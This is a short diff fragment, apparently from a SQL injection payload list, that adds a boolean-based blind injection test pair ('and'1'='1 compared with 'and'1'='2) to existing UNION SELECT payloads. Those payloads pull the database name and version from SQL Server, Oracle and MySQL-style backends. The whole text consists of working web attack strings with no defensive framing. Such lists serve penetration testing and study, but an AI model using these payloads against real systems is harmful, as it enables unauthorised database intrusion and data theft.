@@ -3,3 +3,4 @@
 UNION SELECT 1,2,DB_NAME(),4,5--
 UNION SELECT 1,2,SYS_CONTEXT('USERENV','DB_NAME'),4,5 FROM dual--
 AND (SELECT @@version FROM dual)='1'--
+'and'1'='1  对比   'and+'1'='2
